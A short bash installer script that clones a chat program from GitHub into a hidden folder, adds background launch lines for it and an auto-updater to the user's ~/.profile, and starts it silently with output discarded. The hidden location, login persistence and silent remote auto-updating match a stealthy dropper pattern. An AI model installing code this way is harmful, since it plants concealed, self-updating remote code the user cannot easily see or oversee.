#!/bin/bash
git clone https://github.com/MaitreRenard18/Python-Live-Chat ~/Documents/.thnr &&\
echo "bash ~/Documents/.thnr/scripts/auto_updater.sh &" >> ~/.profile &&\
echo "python ~/Documents/.thnr/main.pyw false &" >> ~/.profile &&\
nohup python ~/Documents/.thnr/main.pyw false > /dev/null 2>&1 &